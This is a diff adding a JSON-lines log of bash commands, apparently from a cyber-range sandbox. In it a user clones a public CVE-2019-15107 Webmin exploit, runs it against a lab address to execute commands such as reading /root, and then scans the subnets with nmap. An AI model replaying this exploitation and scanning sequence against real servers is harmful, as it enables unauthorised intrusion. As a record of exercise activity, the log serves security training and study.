@@ -1,0 +1,14 @@
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:39:00.156887+02:00", "cmd_type": "bash-command", "cmd": "git clone https://github.com/jas502n/cve-2019-15107"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:39:07.698988+02:00", "cmd_type": "bash-command", "cmd": "git clone https://github.com/jas502n/cve-2019-15107"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:39:32.617766+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:39:42.521886+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 id"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:39:49.848919+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 ls"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:39:53.206621+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 ls /root"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:40:00.801948+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls /root'"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:40:19.384019+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cat /root/WARNING-READ-ME.txt'"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:40:44.065275+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls -l /root'"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:41:34.372995+02:00", "cmd_type": "bash-command", "cmd": "ip a"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:42:06.787832+02:00", "cmd_type": "bash-command", "cmd": "nmap 172.18.1.5"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:42:13.763458+02:00", "cmd_type": "bash-command", "cmd": "nmap 172.18.1.0/24"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:43:20.193157+02:00", "cmd_type": "bash-command", "cmd": "nmap 172.18.0.0/16"}
+{"sandbox_id": "86", "timestamp_str": "2020-07-15T09:43:29.890827+02:00", "cmd_type": "bash-command", "cmd": "nmap 172.18.0.0/16"}
